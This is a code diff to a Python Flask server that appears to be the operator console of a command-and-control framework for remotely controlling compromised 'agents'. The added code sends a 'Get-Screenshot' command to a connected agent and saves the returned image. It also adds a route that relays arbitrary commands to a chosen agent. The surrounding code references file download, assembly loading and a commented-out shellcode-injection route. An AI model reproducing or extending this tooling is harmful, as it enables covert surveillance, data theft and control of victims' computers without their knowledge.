@@ -136,6 +136,19 @@ def handle_connection(connection,address,thread_index):
                     FILE_OUTPUT[thread_index] = msg
                     FILE_INPUT[thread_index]=''
 
+
+                elif CMD_INPUT[thread_index]=="Get-Screenshot":
+                    cmd = CMD_INPUT[thread_index]
+                    connection.send(cmd.encode())
+                    encodedimage = connection.recv(BUFFER_SIZE*100).decode()
+                    imagebytes = base64.b64decode(encodedimage)
+                    f = open("temp.jpg","wb")
+                    f.write(imagebytes)
+                    f.close()
+                    CMD_OUTPUT[thread_index] = "Screenshot Captured"
+                    CMD_INPUT[thread_index] = ""
+
+
                 elif CMD_INPUT[thread_index].split(" ")[0]=='download':
                         #download filename
                         filename = CMD_INPUT[thread_index].split(" ")[1].split("\\")[-1]
@@ -245,6 +258,7 @@ def server_socket():
         connection , address = ss.accept()
         thread_index = len(THREADS)
         t = threading.Thread(target=handle_connection,args=(connection,address,len(THREADS)))
+        t.name = t.name.split(" ")[0]
         THREADS.append(t)
         IPS[thread_index]=address
         t.start()
@@ -275,6 +289,7 @@ def home():
 
 @app.route("/agents")
 def agents():
+    #print(THREADS)
     return render_template('agents.html',threads=THREADS,ips=IPS)
 
 
@@ -521,6 +536,22 @@ def loadassembly(agentname):
     time.sleep(1)
     cmdoutput = LOAD_OUTPUT[req_index]
     return render_template('loadassembly.html',agentname=agentname)
+    
+
+
+@app.route("/<agentname>/misc",methods=["GET","POST"])
+def misc(agentname):
+    for i in range(len(THREADS)):
+        if agentname in THREADS[i].name:
+            cmd_index = THREADS.index(THREADS[i])
+    if(request.args.get('cmd')!=None):
+        cmd = request.args.get('cmd')
+        CMD_INPUT[cmd_index] = cmd
+        time.sleep(3)
+        status = CMD_OUTPUT[cmd_index]
+        return render_template("misc.html",agentname=agentname,status=status)
+
+    return render_template("misc.html",agentname=agentname)
     
 
 '''@app.route("/<agentname>/injectshellcode",method=["GET","POST"])
